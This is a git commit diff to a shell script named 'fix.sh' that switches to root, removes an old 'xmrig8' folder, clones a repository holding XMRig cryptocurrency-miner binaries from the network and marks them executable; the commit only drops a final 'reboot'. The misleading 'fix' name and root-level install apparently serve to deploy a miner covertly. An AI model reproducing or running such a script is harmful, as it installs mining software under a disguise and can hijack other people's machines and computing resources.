0931b94ea2c0d8c3562bee38427d90420896e796
vhakgg57448 <98292499+vhakgg57448@users.noreply.github.com>
2022-01-24 01:43:49 +0000

    Update fix.sh

--- fix.sh
+++ fix.sh
@@ -3,5 +3,5 @@ sudo su &&
 cd ~ && 
 cd / &&
 rm -rf xmrig8 && 
-sudo git clone https://github.com/vhakgg57448/xmrig8.git&&cd xmrig8&&sudo chmod +x xmrig&&sudo chmod +x  xmrig-notls&&
-reboot
+sudo git clone https://github.com/vhakgg57448/xmrig8.git&&cd xmrig8&&sudo chmod +x xmrig&&sudo chmod +x  xmrig-notls
+
